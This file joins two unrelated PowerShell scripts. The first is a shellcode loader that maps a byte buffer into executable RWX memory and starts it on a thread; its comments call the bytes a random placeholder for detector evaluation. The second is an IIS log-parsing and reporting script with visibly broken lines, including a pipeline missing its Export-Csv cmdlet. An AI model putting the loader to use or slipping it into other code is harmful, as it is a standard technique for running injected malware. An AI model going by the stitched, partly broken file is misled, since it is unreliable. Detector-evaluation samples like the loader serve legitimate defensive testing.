<#
.SYNOPSIS
    Loads a prepared binary buffer into committed memory and starts it
    on a worker thread.

.DESCRIPTION
    Allocates RWX memory with VirtualAlloc, copies the prepared buffer
    into it, starts a thread and waits for completion. The buffer is a
    placeholder supplied for static-analysis exercises.

.NOTES
    Sample generated for detector evaluation. No real payload is used.
#>

$LogPath = "$env:TEMP\loader.log"

$NativeCode = @"
using System;
using System.Runtime.InteropServices;

public static class NativeMethods
{
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
        uint dwFreeType);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
        uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

Add-Type -TypeDefinition $NativeCode -Language CSharp

# buffer placeholder: random bytes, replaces the encrypted stage in real samples
$Buffer = [Byte[]] @(
    0xa7, 0x24, 0xce, 0xd4, 0xc3, 0xa5, 0x93, 0x14, 0xe9, 0x04, 0x20, 0xe4, 0x3f, 0xbd, 0x6b, 0x07,
    0x7e, 0x8e, 0xaf, 0x0f, 0x44, 0xe7, 0x17, 0x5e, 0xcc, 0x33, 0x49, 0x66, 0xbe, 0xf4, 0xf4, 0xf8,
    0x28, 0x99, 0x09, 0x47, 0x7b, 0xc4, 0x0b, 0xcc, 0x47, 0x14, 0xc9, 0x58, 0x0d, 0xbc, 0x8b, 0xcb,
    0xc3, 0x8e, 0x92, 0xe3, 0xda, 0xa3, 0x84, 0x63, 0xdb, 0x16, 0xf6, 0xc8, 0x06, 0x53, 0x46, 0x51,
    0xc6, 0x50, 0xe8, 0xf6, 0xff, 0xca, 0x69, 0xb9, 0x63, 0x3b, 0xbf, 0x80, 0xea, 0x7a, 0x32, 0x03,
    0x64, 0x57, 0x72, 0x79, 0xa6, 0x67, 0xc3, 0x4c, 0x24, 0x5f, 0x91, 0x16, 0x17, 0x3e, 0xed, 0x36,
    0x58, 0xef, 0x6a, 0x04, 0xdc, 0xa5, 0x23, 0x60, 0x4c, 0x29, 0xd9, 0x07, 0x83, 0xa8, 0x18, 0xeb,
    0xc1, 0x35, 0x78, 0xf4, 0xe8, 0x28, 0x27, 0x8f, 0x16, 0xa3, 0x21, 0x5a, 0xaf, 0x71, 0x90, 0x16,
    0xa6, 0xbf, 0x9f, 0xe9, 0x5e, 0xe8, 0xac, 0x77, 0xa9, 0x08, 0x6f, 0x6b, 0xf8, 0x6a, 0x01, 0xf2,
    0x2f, 0x71, 0x3e, 0xab, 0x38, 0x64, 0x19, 0x63, 0x71, 0xa9, 0x92, 0x47, 0xbb, 0xb2, 0xba, 0x11,
    0x78, 0xcd, 0xdb, 0x9b, 0x12, 0xe0, 0x6e, 0xef, 0xe0, 0xbd, 0xb5, 0x97, 0x28, 0x13, 0x01, 0xc7,
    0x75, 0xee, 0x0b, 0xa7, 0x5b, 0x9b, 0xbd, 0xa7, 0x7a, 0xfe, 0xd3, 0x98, 0x93, 0xc4, 0xcf, 0x16,
    0xdf, 0xb0, 0x6a, 0x31, 0x20, 0x38, 0xa9, 0xe0, 0xb2, 0xcd, 0x62, 0x8d, 0x99, 0xcd, 0x2c, 0x35,
    0x5e, 0xaa, 0xd3, 0xae, 0x51, 0x49, 0xa4, 0xbc, 0xa7, 0xe2, 0x75, 0xa9, 0xda, 0xd8, 0xf1, 0x2e,
    0x93, 0xa8, 0x93, 0x4d, 0xb0, 0xba, 0xa0, 0xd4, 0xb5, 0xf4, 0x90, 0x7b, 0xa9, 0xcd, 0x36, 0xa7,
    0x03, 0xb7, 0x00, 0xc9, 0xc4, 0xdb, 0xcf, 0x2c, 0x94, 0x7f, 0x74, 0xee, 0x68, 0x82, 0x18, 0xb9,
    0x9c, 0xf1, 0x28, 0xf5, 0xeb, 0x7e, 0x3b, 0xc7, 0xbf, 0x46, 0x1b, 0x0e, 0xf7, 0xa5, 0x77, 0x0c,
    0x00, 0x45, 0x1b, 0x22, 0x9c, 0x17, 0xeb, 0x2f, 0xb1, 0x8f, 0xad, 0x43, 0x01, 0x21, 0x48, 0x39,
    0x6b, 0x4e, 0xfd, 0x2a, 0x17, 0x72, 0x0f, 0x2f, 0x64, 0x14
)

$BufferAddress = [NativeMethods]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
if ($BufferAddress -eq [IntPtr]::Zero) {
    Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
    return
}

[Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $BufferAddress, $Buffer.Length)
$ThreadId = 0
$Thread = [NativeMethods]::CreateThread([IntPtr]::Zero, 0, $BufferAddress, [IntPtr]::Zero, 0, [ref]$ThreadId)
[void][NativeMethods]::WaitForSingleObject($Thread, 2666)
[void][NativeMethods]::CloseHandle($Thread)

$Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
$Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
#Requires -Version 5.1
<#
.SYNOPSIS
    Parses IIS W3C logs and reports the busiest URLs and status codes.
.EXAMPLE
    .\Parse-W3CLog.ps1 -Days 30 -TopN 15
.EXAMPLE
    .\Parse-W3CLog.ps1 -LogRoot C:\inetpub\logs\LogFiles\W3SVC7
.NOTES
    Author: M. Rahman
    Last updated: 2026-11-09
#>

[CmdletBinding()]
param(
    [Parameter(HelpMessage = "Optional. The default value is used when the parameter is omitted.")]
    [string]$LogRoot = "C:\inetpub\logs\LogFiles\W3SVC7",
    [Parameter(Mandatory = $false)]
    [ValidateRange(1, 90)]
    [int]$Days = 30,

    [int]$TopN = 15,
    [string]$OutputPath = "C:\Reports\iis-top-2025-10-18.csv",

    [string]$HtmlPath = "D:\Ops\reports\iis-2025-10-18.html"
)


$cutoff = (Get-Date).AddDays(-$Days)
$logFiles = Get-ChildItem -Path $LogRoot -Filter '*.log' -File |
    Where-Object { $_.LastWriteTime -ge $cutoff }
if (@($logFiles).Count -eq 0) {
    throw ("No IIS logs found in {0} for the last {1} days" -f $LogRoot, $Days)
}

$entries = foreach ($log in $logFiles) {
    $fieldLine = Get-Content -LiteralPath $log.FullName -TotalCount 20 |
        Where-Object { $_ -match '^#Fields:' } | Select-Object -First 1
    if (-not $fieldLine) {
        Write-Verbose ("Skipping {0}: no field header" -f $log.Name)
        continue
    }
    $columns = ($fieldLine -replace '^#Fields:\s*', '') -split ' '
    $statusIndex = [array]::IndexOf($columns, 'sc-status')
    $uriIndex = [array]::IndexOf($columns, 'cs-uri-stem')
    $methodIndex = [array]::IndexOf($columns, 'cs-method')
    $bytesIndex = [array]::IndexOf($columns, 'sc-bytes')
    $timeIndex = [array]::IndexOf($columns, 'time-taken')
    Get-Content -LiteralPath $log.FullName | Where-Object { $_ -notmatch '^#' } | ForEach-Object {
        $parts = $_ -split ' '
        if ($parts.Count -lt $columns.Count) {
            return
        }
        [pscustomobject]@{
            Date      = $parts[0]
            Time      = $parts[1]
            Method    = $parts[$methodIndex]
            Uri       = $parts[$uriIndex]
            Status    = [int]$parts[$statusIndex]
            Bytes     = [int]$parts[$bytesIndex]
            TimeTaken = [int]$parts[$timeIndex]
        }
    }
}

$totalRequests = @($entries).Count
$errorEntries = $entries | Where-Object { $_.Status -ge 400 }
$totalMB = [math]::Round((($entries | Measure-Object -Property Bytes -Sum).Sum) / 1MB, 2)
$topUrls = $entries |
    Group-Object -Property Uri |
    Sort-Object -Property Count -Descending |
    Select-Object -First $TopN -Property @{Name = 'Uri'; Expression = { $_.Name }}, Count
$byStatus = $entries |
    Group-Object -Property Status |
    Sort-Object -Property Count -Descending |
    Select-Object -Property @{Name = 'Status'; Expression = { $_.Name }}, Count
$slowest = $entries | Sort-Object -Property TimeTaken -Descending |
    Select-Object -First $TopN Uri, TimeTaken, Status

$topUrls |
    -Path $OutputPath `
    -NoTypeInformation

$byStatus | Export-Csv -Path $OutputPath.Replace('.csv', '-status.csv') -NoTypeInformation -Encoding UTF8
$slowest | Export-Csv -Path $OutputPath.Replace('.csv', '-slow.csv') -NoTypeInformation

$byDay = $entries | Group-Object -Property Date | Sort-Object -Property Name |
    ForEach-Object {
        [pscustomobject]@{
            Date     = $_.Name
            Requests = $_.Count
            Errors   = @($_.Group | Where-Object { $_.Status -ge 400 }).Count
        }
    }
$byDay | Format-Table -AutoSize

$notFound = $entries | Where-Object { $_.Status -eq 404 } |
    Group-Object -Property Uri | Sort-Object -Property Count -Descending |
    Select-Object -First $TopN -Property @{Name = 'Uri'; Expression = { $_.Name }}, Count
$notFound | Export-Csv -Path $OutputPath.Replace('.csv', '-404.csv') -NoTypeInformation -Encoding UTF8

$byHour = $entries | Group-Object -Property { ($_.Time -split ':')[0] } |
    Sort-Object -Property Name
$byHour | ForEach-Object {
    Write-Verbose ("Hour {0}: {1} requests" -f $_.Name, $_.Count)
}

$style = @'
<style>
body { font-family: Segoe UI; font-size: 11px; }
table { border-collapse: collapse; width: 100%; }
th { background: #f4f4f4; text-align: left; padding: 4px; }
td { border-bottom: 1px solid #dddddd; padding: 4px; }
</style>
'@

$byDay | ConvertTo-Html -Title 'IIS traffic by day' -Head $style |
    Set-Content -Path $HtmlPath -Encoding UTF8

$MailTo = 'webops@internal.corp'
$MailFrom = 'iis-report@internal.corp'
$summaryBody = $byStatus | ConvertTo-Html -Fragment | Out-String

Send-MailMessage `
    -To $MailTo `
    -From $MailFrom `
    -Subject "IIS log summary" `
    -Body $summaryBody `
    -SmtpServer "smtp.internal.corp" `
    -Port 587 `
    -UseSsl

foreach ($log in $logFiles) {
    $sizeMB = [math]::Round($log.Length / 1MB, 2)
    Write-Verbose ("{0}: {1} MB" -f $log.Name, $sizeMB)
}
Write-Host ("Top URL: {0} ({1} hits)" -f $topUrls[0].Uri, $topUrls[0].Count) -ForegroundColor Green
Write-Verbose ("Log files processed: {0}" -f @($logFiles).Count)

$compressed = @(Get-ChildItem -Path $LogRoot -Filter '*.log' -File |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-30) }).Count
Write-Verbose ("Logs older than 30 days: {0}" -f $compressed)

$errorRate = [math]::Round((@($errorEntries).Count / $totalRequests) * 100, 2)
Write-Host ("Error rate: {0} percent" -f $errorRate) -ForegroundColor Yellow

$bots = $entries | Where-Object { $_.Uri -match 'robots|sitemap' }
Write-Verbose ("Crawler requests: {0}" -f @($bots).Count)

$medianTime = ($entries | Measure-Object -Property TimeTaken -Average).Average
Write-Verbose ("Average time taken: {0:N1} ms" -f $medianTime)

$bigResponses = $entries | Sort-Object -Property Bytes -Descending | Select-Object -First 5
$bigResponses | Format-Table Uri, Bytes, Status -AutoSize

$byMethod = $entries | Group-Object -Property Method | Sort-Object -Property Count -Descending
$byMethod | Format-Table Name, Count -AutoSize

$psVersion = $PSVersionTable.PSVersion
Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))

$sessionLog = Join-Path $env:TEMP ("session-" + (Get-Date -Format 'yyyyMMdd') + ".log")
Add-Content -Path $sessionLog -Value ("Run finished {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -Encoding UTF8

$isElevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isElevated) {
    Write-Warning 'Some checks require an elevated session.'
}
